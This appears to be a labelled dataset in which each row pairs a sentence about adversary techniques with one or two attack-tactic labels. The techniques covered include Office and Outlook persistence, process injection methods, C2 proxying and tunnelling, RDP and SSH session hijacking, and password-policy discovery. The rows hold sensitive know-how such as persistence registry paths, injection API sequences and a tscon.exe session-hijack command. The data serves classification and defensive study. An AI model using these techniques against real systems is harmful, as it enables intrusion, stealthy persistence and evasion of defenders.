"Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols.",RESOURCE_DEVELOPMENT,,,
"In addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities.",RESOURCE_DEVELOPMENT,,,
"Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals.",RESOURCE_DEVELOPMENT,,,
"In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",RESOURCE_DEVELOPMENT,,,
"Adversaries may buy, steal, or download software tools that can be used during targeting.",RESOURCE_DEVELOPMENT,,,
"Tools can be open or closed source, free or commercial.",RESOURCE_DEVELOPMENT,,,
"A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec]).",RESOURCE_DEVELOPMENT,,,
"Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike].",RESOURCE_DEVELOPMENT,,,
"Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.",RESOURCE_DEVELOPMENT,,,
"Adversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors.",RESOURCE_DEVELOPMENT,,,
"In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",RESOURCE_DEVELOPMENT,,,
Adversaries may acquire information about vulnerabilities that can be used during targeting.,RESOURCE_DEVELOPMENT,,,
"A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur.",RESOURCE_DEVELOPMENT,,,
Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.,RESOURCE_DEVELOPMENT,,,
"An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities.",RESOURCE_DEVELOPMENT,,,
There is usually a delay between when a vulnerability is discovered and when it is made public.,RESOURCE_DEVELOPMENT,,,
An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors).,RESOURCE_DEVELOPMENT,,,
Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits]) or to attempt to develop one themselves (i.e. [Exploits]).,RESOURCE_DEVELOPMENT,,,
Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network.,PERSISTENCE,,,
There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.,PERSISTENCE,,,
"A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.",PERSISTENCE,,,
Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system.,PERSISTENCE,,,
Office add-ins can be used to add functionality to Office programs.,PERSISTENCE,,,
Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.,PERSISTENCE,,,
Adversaries may abuse Microsoft Office templates to obtain persistence on a compromised system.,PERSISTENCE,,,
Microsoft Office contains templates that are part of common Office applications and are used to customize styles.,PERSISTENCE,,,
The base templates within the application are used each time an application starts.,PERSISTENCE,,,
Office Visual Basic for Applications (VBA) macros.,PERSISTENCE,,,
Word Normal.dotm location:<br>.,PERSISTENCE,,,
C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Templates\Normal.dotm.,PERSISTENCE,,,
Excel Personal.xlsb location:<br>.,PERSISTENCE,,,
C:\Users\&lt;username&gt;\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB.,PERSISTENCE,,,
"Adversaries may also change the location of the base template to point to their own by hijacking the application's search order, e.g.",PERSISTENCE,,,
"Word 2016 will first look for Normal.dotm under C:\Program Files (x86)\Microsoft Office\root\Office16\, or by modifying the GlobalDotName registry key.",PERSISTENCE,,,
"By modifying the GlobalDotName registry key an adversary can specify an arbitrary location, file name, and file extension to use for the template that will be loaded on application startup.",PERSISTENCE,,,
"To abuse GlobalDotName, adversaries may first need to register the template as a trusted document or place it in a trusted location.",PERSISTENCE,,,
An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.,PERSISTENCE,,,
"Adversaries may abuse the Microsoft Office ""Office Test"" Registry key to obtain persistence on a compromised system.",PERSISTENCE,,,
An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started.,PERSISTENCE,,,
This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications.,PERSISTENCE,,,
This Registry key is not created by default during an Office installation.,PERSISTENCE,,,
"There exist user and global Registry keys for the Office Test feature:



* HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf

* HKEY_LOCAL_MACHINE\Software\Microsoft\Office test\Special\Perf.",PERSISTENCE,,,
"Adversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",PERSISTENCE,,,
Adversaries may abuse Microsoft Outlook forms to obtain persistence on a compromised system.,PERSISTENCE,,,
Outlook forms are used as templates for presentation and functionality in Outlook messages.,PERSISTENCE,,,
Custom Outlook forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.,PERSISTENCE,,,
"Once malicious forms have been added to the user’s mailbox, they will be loaded when Outlook is started.",PERSISTENCE,,,
Malicious forms will execute when an adversary sends a specifically crafted email to the user.,PERSISTENCE,,,
Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system.,PERSISTENCE,,,
Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders.,PERSISTENCE,,,
This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened.,PERSISTENCE,,,
A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.,PERSISTENCE,,,
"Once malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started.",PERSISTENCE,,,
Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.,PERSISTENCE,,,
Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system.,PERSISTENCE,,,
Outlook rules allow a user to define automated behavior to manage email messages.,PERSISTENCE,,,
"A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender.",PERSISTENCE,,,
Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.,PERSISTENCE,,,
"Once malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started.",PERSISTENCE,,,
Malicious rules will execute when an adversary sends a specifically crafted email to the user.,PERSISTENCE,,,
Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force].,DISCOVERY,,,
"This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).",DISCOVERY,,,
"Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as net accounts (/domain), Get-ADDefaultDomainPasswordPolicy, chage -l <username>, cat /etc/pam.d/common-password, and pwpolicy getaccountpolicies.",DISCOVERY,,,
Password policies can be discovered in cloud environments using available APIs such as GetAccountPasswordPolicy in AWS .,DISCOVERY,,,
"Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage.",DISCOVERY,,,
The information may be used to enhance their awareness of the system and network environment or may be used for further actions.,DISCOVERY,,,
Adversaries may attempt to find group and permission settings.,DISCOVERY,,,
"This information can help adversaries determine which user accounts and groups are available, the membership of users in particular groups, and which users and groups have elevated permissions.",DISCOVERY,,,
Adversaries may attempt to find cloud groups and permission settings.,DISCOVERY,,,
"The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.",DISCOVERY,,,
With authenticated access there are several tools that can be used to find permissions groups.,DISCOVERY,,,
The Get-MsolRole PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts .,DISCOVERY,,,
Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups.,DISCOVERY,,,

Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems.,INITIAL_ACCESS,,,
Spearphishing with a link is a specific variant of spearphishing.,INITIAL_ACCESS,,,
"It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments.",INITIAL_ACCESS,,,

"In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.",INITIAL_ACCESS,,,
These services are more likely to have a less-strict security policy than an enterprise.,INITIAL_ACCESS,,,
"As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way.",INITIAL_ACCESS,,,
Adversaries will create fake social media accounts and message employees for potential job opportunities.,INITIAL_ACCESS,,,
"Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment.",INITIAL_ACCESS,,,
The adversary can then send malicious links or attachments through these services.,INITIAL_ACCESS,,,
"A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer.",INITIAL_ACCESS,,,
"This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting.",INITIAL_ACCESS,,,
"If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",INITIAL_ACCESS,,,
"Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the info.plist file, to store properties and configuration settings that inform the operating system how to handle the application at runtime.",DEFENSE_EVASION,,,

Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system.,DEFENSE_EVASION,PERSISTENCE,,
This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.,DEFENSE_EVASION,PERSISTENCE,,

Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS.,DEFENSE_EVASION,PERSISTENCE,,
This technique may be similar to [System Firmware] but conducted upon other system components/devices that may not have the same capability or level of integrity checking.,DEFENSE_EVASION,PERSISTENCE,,
"Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",DEFENSE_EVASION,PERSISTENCE,,
Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect.,DEFENSE_EVASION,PERSISTENCE,,
"ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset.",DEFENSE_EVASION,PERSISTENCE,,

Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.,DEFENSE_EVASION,PERSISTENCE,,
System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity.,DEFENSE_EVASION,PERSISTENCE,,
"Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",DEFENSE_EVASION,PERSISTENCE,,
Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server.,DEFENSE_EVASION,PERSISTENCE,,
TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server.,DEFENSE_EVASION,PERSISTENCE,,
"Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.",DEFENSE_EVASION,PERSISTENCE,,
"Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image] to load a modified image on device startup or reset.",DEFENSE_EVASION,PERSISTENCE,,
"The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality.",DEFENSE_EVASION,PERSISTENCE,,
This technique is similar to [ROMMONkit] and may result in the network device running a modified image.,DEFENSE_EVASION,PERSISTENCE,,
Adversaries may attempt to get information about running processes on a system.,DISCOVERY,,,
Information obtained could be used to gain an understanding of common software/applications running on systems within the network.,DISCOVERY,,,

"Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"There are many different ways to inject code into a process, many of which abuse legitimate functionalities.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
These implementations exist for every major OS but are typically platform specific.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,

Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
DLL injection is a method of executing arbitrary code in the address space of a separate live process.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
DLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread (which calls the LoadLibrary API responsible for loading the DLL).",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Variations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of LoadLibrary).,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
EWM injection is a method of executing arbitrary code in the address space of a separate live process.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Execution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Writing payloads to shared sections also avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,

"Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored WriteProcessMemory function.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"For example, an adversary can use the PostMessage and/or SendMessage API functions to send LVM_SETITEMPOSITION and LVM_GETITEMPOSITION messages, effectively copying a payload 2 bytes at a time to the allocated memory.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"Finally, the payload is triggered by sending the LVM_SORTITEMS message to the SysListView32 child of the process window, with the payload within the newly allocated buffer passed and executed as the ListView_SortItems callback.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
PE injection is a method of executing arbitrary code in the address space of a separate live process.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"The write can be performed with native Windows API calls such as VirtualAllocEx and WriteProcessMemory, then invoked with CreateRemoteThread or additional code (ex: shellcode).",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,

Proc memory injection is a method of executing arbitrary code in the address space of a separate live process.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Proc memory injection involves enumerating the memory of a process via the /proc filesystem (/proc/[pid]) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"Each running process has its own directory, which includes memory mappings.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR).,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"Once enumerated, the target processes’ memory map within /proc/[pid]/maps can be overwritten using dd.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,

Adversaries may abuse TxF to a perform a file-less variation of [Process Injection].,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"Similar to [Process Hollowing], process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"Process Doppelgänging is implemented in 4 steps :



* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"These changes will be isolated and only visible within the context of the transaction.

* Load – Create a shared section of memory and load the malicious executable.

* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.

* Animate – Create a process from the tainted section of memory and initiate execution.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,

"A victim process can be created with native Windows API calls such as CreateProcess, which includes a flag to suspend the processes primary thread.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"At this point the process can be unmapped using APIs calls such as ZwUnmapViewOfSection or NtUnmapViewOfSection before being written to, realigned to the injected code, and resumed via VirtualAllocEx, WriteProcessMemory, SetThreadContext, then ResumeThread respectively.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
This is very similar to [Thread Local Storage] but creates a new process rather than targeting an existing process.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,

This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems.,COMMAND_AND_CONTROL,,,
Tunneling involves explicitly encapsulating a protocol within another.,COMMAND_AND_CONTROL,,,
This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN).,COMMAND_AND_CONTROL,,,
"Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet.",COMMAND_AND_CONTROL,,,
There are various means to encapsulate a protocol within another protocol.,COMMAND_AND_CONTROL,,,
"For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel. 



[Protocol Tunneling] may also be abused by adversaries during [Dynamic Resolution].",COMMAND_AND_CONTROL,,,
"Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.",COMMAND_AND_CONTROL,,,
Adversaries may also leverage [Protocol Tunneling] in conjunction with [Proxy] and/or [Protocol Impersonation] to further conceal C2 communications and infrastructure.,COMMAND_AND_CONTROL,,,
Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.,COMMAND_AND_CONTROL,,,
"Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN], ZXProxy, and ZXPortMap.",COMMAND_AND_CONTROL,,,
"Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion.",COMMAND_AND_CONTROL,,,
Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.,COMMAND_AND_CONTROL,,,
Adversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.,COMMAND_AND_CONTROL,,,
Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. .,COMMAND_AND_CONTROL,,,
"For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header.",COMMAND_AND_CONTROL,,,
"Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.",COMMAND_AND_CONTROL,,,
Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.,COMMAND_AND_CONTROL,,,
"Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.",COMMAND_AND_CONTROL,,,
External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors.,COMMAND_AND_CONTROL,,,
"Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers.",COMMAND_AND_CONTROL,,,
Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated.,COMMAND_AND_CONTROL,,,
Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.,COMMAND_AND_CONTROL,,,
Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment.,COMMAND_AND_CONTROL,,,
"Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN], ZXProxy, and ZXPortMap. networking protocols, such as SMB, to better blend in with the environment.",COMMAND_AND_CONTROL,,,
"By using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.",COMMAND_AND_CONTROL,,,
"To disguise the source of malicious traffic, adversaries may chain together multiple proxies.",COMMAND_AND_CONTROL,,,
"Typically, a defender will be able to identify the last proxy traffic traversed before it enters their network; the defender may or may not be able to identify any previous proxies before the last-hop proxy.",COMMAND_AND_CONTROL,,,
This technique makes identifying the original source of the malicious traffic even more difficult by requiring the defender to trace malicious traffic through several proxies to identify its source.,COMMAND_AND_CONTROL,,,
"A particular variant of this behavior is to use onion routing networks, such as the publicly available TOR network.",COMMAND_AND_CONTROL,,,
"In the case of network infrastructure, particularly routers, it is possible for an adversary to leverage multiple compromised devices to create a multi-hop proxy chain within the Wide-Area Network (WAN) of the enterprise.",COMMAND_AND_CONTROL,,,
"By leveraging [Patch System Image], adversaries can add custom code to the affected network devices that will implement onion routing between those nodes.",COMMAND_AND_CONTROL,,,
"This custom onion routing network will transport the encrypted C2 traffic through the compromised population, allowing adversaries to communicate with any device within the onion routing network.",COMMAND_AND_CONTROL,,,
This method is dependent upon the [Network Boundary Bridging] method in order to allow the adversaries to cross the protected network boundary of the Internet perimeter and into the organization’s WAN.,COMMAND_AND_CONTROL,,,
Protocols such as ICMP may be used as a transport.,COMMAND_AND_CONTROL,,,
"The Registry contains a significant amount of information about the operating system, configuration, software, and security. during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",DISCOVERY,,,
"Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk.",DEFENSE_EVASION,,,
"Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).",DEFENSE_EVASION,,,
Reflective code injection is very similar to [Process Injection] except that the “injection” loads code into the processes’ own memory instead of that of a separate process.,DEFENSE_EVASION,,,
Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process.,DEFENSE_EVASION,,,
"Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.",DEFENSE_EVASION,,,
"An adversary may use legitimate desktop support and remote access software, such as Team Viewer, AnyDesk, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.",COMMAND_AND_CONTROL,,,
"These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.",COMMAND_AND_CONTROL,,,
"Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries.",COMMAND_AND_CONTROL,,,
Remote access tools may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system.,COMMAND_AND_CONTROL,,,
They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system.,COMMAND_AND_CONTROL,,,
Installation of many remote access tools may also include persistence (ex: the tool's installation routine creates a [Windows Service]).,COMMAND_AND_CONTROL,,,
Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.,COMMAND_AND_CONTROL,,,
"Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP.",LATERAL_MOVEMENT,,,
"When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.",LATERAL_MOVEMENT,,,
Adversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking] differs from use of [Remote Services] because it hijacks an existing session rather than creating a new session using [Valid Accounts].,LATERAL_MOVEMENT,,,
Adversaries may hijack a legitimate user’s remote desktop session to move laterally within an environment.,LATERAL_MOVEMENT,,,
Remote desktop is a common feature in operating systems.,LATERAL_MOVEMENT,,,
It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system.,LATERAL_MOVEMENT,,,
Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).,LATERAL_MOVEMENT,,,
Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session.,LATERAL_MOVEMENT,,,
"Typically, a user is notified when someone else is trying to steal their session.",LATERAL_MOVEMENT,,,
"With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.",LATERAL_MOVEMENT,,,
Adversaries may hijack a legitimate user's SSH session to move laterally within an environment.,LATERAL_MOVEMENT,,,
Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems.,LATERAL_MOVEMENT,,,
"It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.",LATERAL_MOVEMENT,,,
"In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system.",LATERAL_MOVEMENT,,,
This may occur through compromising the SSH agent itself or by having access to the agent's socket.,LATERAL_MOVEMENT,,,
"If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.



[SSH Hijacking] differs from use of [SSH] because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts].",LATERAL_MOVEMENT,,,
"Adversaries may use [Valid Accounts] to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC.",LATERAL_MOVEMENT,,,
The adversary may then perform actions as the logged-on user.,LATERAL_MOVEMENT,,,
"In an enterprise environment, servers and workstations can be organized into domains.",LATERAL_MOVEMENT,,,
"Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network.",LATERAL_MOVEMENT,,,
"If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).",LATERAL_MOVEMENT,,,
Legitimate applications (such as [Software Deployment Tools] and other administrative programs) may utilize [Remote Services] to access remote hosts.,LATERAL_MOVEMENT,,,
"For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management.",LATERAL_MOVEMENT,,,
"ARD leverages a blend of protocols, including [VNC] to send the screen and control buffers and [SSH] for secure file transfer.",LATERAL_MOVEMENT,,,
Adversaries may use [Valid Accounts] to interact with remote machines by taking advantage of Distributed Component Object Model (DCOM).,LATERAL_MOVEMENT,,,
"The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces.",LATERAL_MOVEMENT,,,
"Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE).",LATERAL_MOVEMENT,,,
Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.,LATERAL_MOVEMENT,,,
Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.,LATERAL_MOVEMENT,,,
"Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications.",LATERAL_MOVEMENT,,,
Adversaries may use [Valid Accounts] to log into a computer using the Remote Desktop Protocol (RDP).,LATERAL_MOVEMENT,,,
Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials.,LATERAL_MOVEMENT,,,
Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP.,LATERAL_MOVEMENT,,,
Adversaries may also use RDP in conjunction with the [Accessibility Features] or [Terminal Services DLL] for Persistence.,LATERAL_MOVEMENT,,,
Adversaries may use [Valid Accounts] to interact with a remote network share using Server Message Block (SMB).,LATERAL_MOVEMENT,,,
